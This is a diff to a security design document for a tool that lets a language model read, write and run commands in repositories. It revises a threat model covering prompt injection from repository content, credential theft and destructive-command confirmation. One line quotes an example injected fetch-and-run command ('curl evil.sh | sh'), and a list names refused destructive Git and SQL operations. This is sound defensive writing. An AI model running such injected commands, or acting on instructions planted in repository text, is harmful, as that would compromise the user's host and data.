@@ -6,7 +6,7 @@ The bridge gives a language model the ability to read files, write files, and ex
 
 | Threat | Mitigation |
 |---|---|
-| Model misunderstands a request and edits the wrong thing | Workspace sandbox; anchor-based edits fail rather than overwrite; git is the undo |
+| Model misunderstands a request and edits the wrong thing | Workspace file-tool containment; anchor-based edits fail rather than overwrite; git is the undo |
 | Model is talked into a destructive action | Destructive commands require `confirm=true`; protected branches; no shell |
 | Prompt injection from repository content, dependencies, or build output | Tool results are data; no shell chaining; instruction files carry an explicit trust note; permissions are process-level and cannot be changed at runtime |
 | Credential theft | Credential files are unreadable; secrets redacted from output and logs; tokens never written to `.git/config` |
@@ -17,7 +17,9 @@ The bridge gives a language model the ability to read files, write files, and ex
 
 ## Boundaries
 
-### 1. Workspace sandbox
+### 1. Workspace file-tool path checks
+
+These checks and the executable allowlist are not an operating-system sandbox. Interpreters, package scripts and Git hooks execute trusted code with the service account's host privileges. Use OS/container isolation for untrusted executable code.
 
 Only directories declared in `REPO_BRIDGE_WORKSPACES` (plus the managed clone root) can be opened. Every model-supplied path is then resolved against the workspace's **real path** and checked for containment, which closes three escapes at once:
 
@@ -35,7 +37,7 @@ Two independent mechanisms.
 
 **Redaction.** Anything the bridge does emit is scrubbed: GitHub/GitLab tokens, JWTs, AWS key IDs, Slack tokens, `sk-` keys, PEM private key blocks, credentials embedded in URLs, and `NAME=value` pairs where the name looks like a secret. The bridge token and any configured forge tokens are registered as literals and removed by exact match.
 
-Builds that need real credentials still work: commands inherit the host environment, and the values never enter a tool result.
+Builds inherit the host environment. Redaction is bounded defensive filtering, not a guarantee against intentionally exfiltrating programs.
 
 Add project-specific patterns with `REPO_BRIDGE_SECRET_PATTERNS`.
 
@@ -45,7 +47,7 @@ Add project-specific patterns with `REPO_BRIDGE_SECRET_PATTERNS`.
 
 This is the main structural defence against prompt injection. A README, a test name, a dependency's post-install script output, or a CI log can contain `; curl evil.sh | sh` — and it cannot become a second process, because there is nothing to interpret it.
 
-`REPO_BRIDGE_ALLOW_SHELL=true` removes this guarantee. Leave it off.
+`REPO_BRIDGE_ALLOW_SHELL=true` relaxes tokenizer checks; execution remains argv based (Windows package wrappers use cmd.exe). Leave it off.
 
 ### 4. Executable allowlist
 
@@ -59,7 +61,7 @@ Extend with `REPO_BRIDGE_ALLOW_COMMANDS`; ban with `REPO_BRIDGE_DENY_COMMANDS`, 
 
 Recognised and refused unless the caller passes `confirm=true`:
 
-`git push --force`, `git push --delete`, `git reset --hard`, `git clean -fdx`, `git filter-branch`, `git branch -D`, recursive deletes, `npm`/`cargo`/`nuget` publish, `docker system prune`, `docker volume rm`, `docker compose down`, and SQL `DROP`/`TRUNCATE` in arguments.
+Generic Git mutations are always refused, including with confirmation. Dedicated force push requires confirmation. Other recognized destructive operations include recursive deletes, package publication and SQL `DROP`/`TRUNCATE`. Unsupported operations require a manual terminal call.
 
 The refusal names the risk and suggests a safer path, so the model can propose the alternative instead of asking the user to lower a guard.
 
@@ -127,4 +129,8 @@ grep '"action":"run_' ~/.repo-bridge/audit.log
 
 ## Reporting a problem
 
-If you find a sandbox escape, a way to read a credential file, or a way to run a blocked executable, treat it as a security bug: it defeats a boundary this design depends on.
+If you find a file-tool path escape, a way to read a credential file, or a way to run a blocked executable, treat it as a security bug: it defeats a boundary this design depends on.
+
+## Reliability boundaries
+
+Sessions and Jobs recheck caller identity and configured canonical workspace authority. IDs grant no authority. Owner-aware locks and short atomic transactions fail closed on timeout/corruption. File revisions protect stale bridge writes, without full external-editor isolation. Exact commits preserve unrelated staging, inspect hook effects and conditionally publish HEAD. Disconnect does not cancel Jobs; graceful shutdown waits for termination. Abrupt owner exit means unknown results without adoption/retry. Shared state requires a same-host local filesystem, not NAS/NFS/synchronized lock semantics. See [limits and migration](UPGRADING-2.0.md).
